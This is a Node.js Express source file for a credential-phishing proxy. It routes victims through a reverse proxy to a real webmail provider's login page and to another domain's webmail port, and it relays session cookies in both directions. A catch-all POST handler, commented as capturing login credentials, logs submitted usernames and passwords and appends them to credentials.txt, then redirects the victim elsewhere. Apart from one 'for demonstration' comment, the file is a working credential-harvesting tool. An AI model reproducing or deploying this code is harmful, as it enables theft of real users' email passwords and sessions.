import express from 'express';
import bodyParser from 'body-parser';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { createProxyMiddleware } from 'http-proxy-middleware';

// Resolve __dirname in ES module
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3001; // Use any available port

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to parse URL-encoded bodies (for form submissions) and JSON
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Middleware to log all incoming requests with detailed information
app.use((req, res, next) => {
  console.log(`\n[${new Date().toISOString()}] Incoming ${req.method} request to ${req.url}`);
  console.log('Headers:', JSON.stringify(req.headers, null, 2));

  if (req.method === 'POST' || req.method === 'PUT') {
    console.log('Body:', JSON.stringify(req.body, null, 2));
  }

  next();
});

// Function to determine the target URL based on incoming request
function getTargetUrl(req) {
  const { host } = req.headers;

  if (host.includes('sasktel')) {
    return 'https://webmail.sasktel.net';
  } else if (host.includes('expertsinmarketing')) {
    return 'https://expertsinmarketing.com:2096';
  }
  
  // Default target if no specific match found
  return 'https://expertsinmarketing.com:2096';
}

// Proxy middleware to forward requests based on the target determined
app.use(
  '/proxy', // Ensure this matches the endpoint you're accessing
  createProxyMiddleware({
    changeOrigin: true,
    secure: false,
    timeout: 20000,
    proxyTimeout: 20000,
    logLevel: 'debug',
    router: (req) => {
      const target = getTargetUrl(req);
      console.log(`Routing request to: ${target}`);
      return target;
    },
    onProxyReq: (proxyReq, req, res) => {
      console.log(`Proxying ${req.method} request to: ${proxyReq.path}`);

      // Forward cookies from the client
      if (req.headers.cookie) {
        proxyReq.setHeader('Cookie', req.headers.cookie);
      }

      // Forward necessary headers
      proxyReq.setHeader('User-Agent', req.headers['user-agent']);
      proxyReq.setHeader('Accept', req.headers['accept']);
      proxyReq.setHeader('Accept-Language', req.headers['accept-language']);
      proxyReq.setHeader('Accept-Encoding', req.headers['accept-encoding']);

      // Handle forwarding the body for POST requests
      if (req.method === 'POST' || req.method === 'PUT') {
        const bodyData = JSON.stringify(req.body);
        proxyReq.setHeader('Content-Type', 'application/json');
        proxyReq.setHeader('Content-Length', Buffer.byteLength(bodyData));
        proxyReq.write(bodyData);
        proxyReq.end();
      }

      console.log('Forwarded Headers:', proxyReq.getHeaders());
    },
    onProxyRes: (proxyRes, req, res) => {
      console.log(`Received response with status ${proxyRes.statusCode}`);

      // Copy cookies from proxy response to client response
      const setCookies = proxyRes.headers['set-cookie'];
      if (setCookies) {
        res.setHeader('Set-Cookie', setCookies);
      }
    },
    onError: (err, req, res) => {
      console.error(`Proxy encountered an error: ${err.message}`);
      if (res.headersSent) {
        return req.socket.destroy();
      }
      res.writeHead(502, { 'Content-Type': 'text/plain' });
      res.end('Bad gateway error occurred while processing your request.');
    },
  })
);

// Enhanced POST handler to capture login credentials
app.post('*', (req, res) => {
  const { user, pass } = req.body;

  if (user && pass) {
    // Log credentials to a file for demonstration purposes
    console.log(`Captured credentials: User: ${user}, Password: ${pass}`);
    fs.appendFileSync('credentials.txt', `User: ${user}, Password: ${pass}\n`);
    // Redirect to an external site
    res.redirect('https://www.example.com');
  } else {
    console.log('POST request received but no valid credentials found.');
    res.sendStatus(400); // Send a bad request status to indicate missing data
  }
});

// Start the HTTP server
app.listen(PORT, () => {
  console.log(`Proxy server running on http://localhost:${PORT}`);
});
